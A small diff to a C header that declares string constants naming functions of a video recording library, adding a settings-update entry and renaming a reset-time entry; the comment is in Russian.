@@ -125,11 +125,12 @@ extern CSSTR EStrLogFieldURL[];
 // Имена функций библиотеки видеозаписи.
 extern CSSTR VideoRecFuncInit[];
 extern CSSTR VideoRecFuncRelease[];
+extern CSSTR VideoRecUpdateSettings[];
 extern CSSTR VideoRecFuncAddIPServer[];
 extern CSSTR VideoRecFuncRecordProcess[];
 extern CSSTR VideoRecFuncRecordWnd[];
 extern CSSTR VideoRecFuncStop[];
-extern CSSTR VideoRecFuncResetTimer[];
+extern CSSTR VideoRecFuncResetTime[];
 extern CSSTR VideoRecFuncSendFiles[];
 extern CSSTR VideoRecFuncSendFilesAsync[];
 extern CSSTR VideoRecFuncIsSendedAsync[];
